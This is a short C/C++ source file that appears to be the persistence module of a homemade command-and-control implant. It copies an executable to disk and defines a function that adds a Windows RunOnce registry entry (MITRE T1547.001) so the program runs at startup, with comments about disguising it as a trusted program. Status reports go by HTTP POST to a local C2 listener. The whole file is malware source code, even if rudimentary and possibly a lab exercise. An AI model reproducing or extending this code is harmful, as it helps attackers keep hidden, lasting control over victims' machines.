#include "http.h"

// Copy executable to disk
BOOL copyExecutableToDisk(char* oldFilePath, char* newFilePath) {
	// Conversion
	LPCTSTR oldFile = (LPCTSTR)oldFilePath;
	LPCTSTR newFile = (LPCTSTR)newFilePath;

	// Copy file, overwrite existing executable if present
	BOOL check = CopyFile(
		oldFile,
		newFile,
		FALSE);

	return check;
}

void Persistence()
{
	// Use registry key to obtain persistence
	// MITRE T1547.001

	LPCSTR runKey = "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce";
	HKEY runKeyResult = {0};

	// Change to HKEY_LOCAL_MACHINE if we can get admin privileges
	if (RegOpenKeyExA(
		HKEY_CURRENT_USER, 
		runKey, 
		0, 
		KEY_WRITE, 
		&runKeyResult) == ERROR_SUCCESS) 
	{
		// Need to figure out what program (that Windows always runs) that we can disguise malware as
		// Or, use a better name, filepath
		LPCSTR valueName = "malware";
		const BYTE* filePath = (LPBYTE)"C:\\Users\\Public\\temp\\malware.exe";
		DWORD filePathLen = strlen("C:\\Users\\Public\\temp\\malware.exe");

		RegSetValueExA(
			runKeyResult, 
			valueName, 
			0, 
			KEY_WRITE, 
			filePath, 
			filePathLen);
	}

	RegCloseKey(runKeyResult);
}

int main(int argc, char* argv[]) {

	std::string outData = "";
	// File path where executable is being copied from (edit later)
	char oldFilePath[] = "test.exe";
	// File path where executable is being copied to (can also edit later)
	char newFilePath[] = "C:\\malware\\test.exe";
	if (copyExecutableToDisk(oldFilePath, newFilePath)) {
		//printf("[INFO] File copied to disk!\n");
		outData = "{\'job_id\': \'0\', \'agent_id\': \'0\', \'command\': \'persistence.exe\', \'status\': \'INFO\', \'output\': \'[INFO] File copied to disk!\'}";
        makeHttpRequestPOST("127.0.0.1", 5000, "/output", 0, outData);
	}
	else {
		//printf("[ERROR] File could not be copied to disk.\n");
		outData = "{\'job_id\': \'0\', \'agent_id\': \'0\', \'command\': \'persistence.exe\', \'status\': \'ERROR\', \'output\': \'[ERROR] File could not be copied to disk.\'}";
        makeHttpRequestPOST("127.0.0.1", 5000, "/output", 0, outData);
	}

	// Run executable at startup
	// Persistence()
}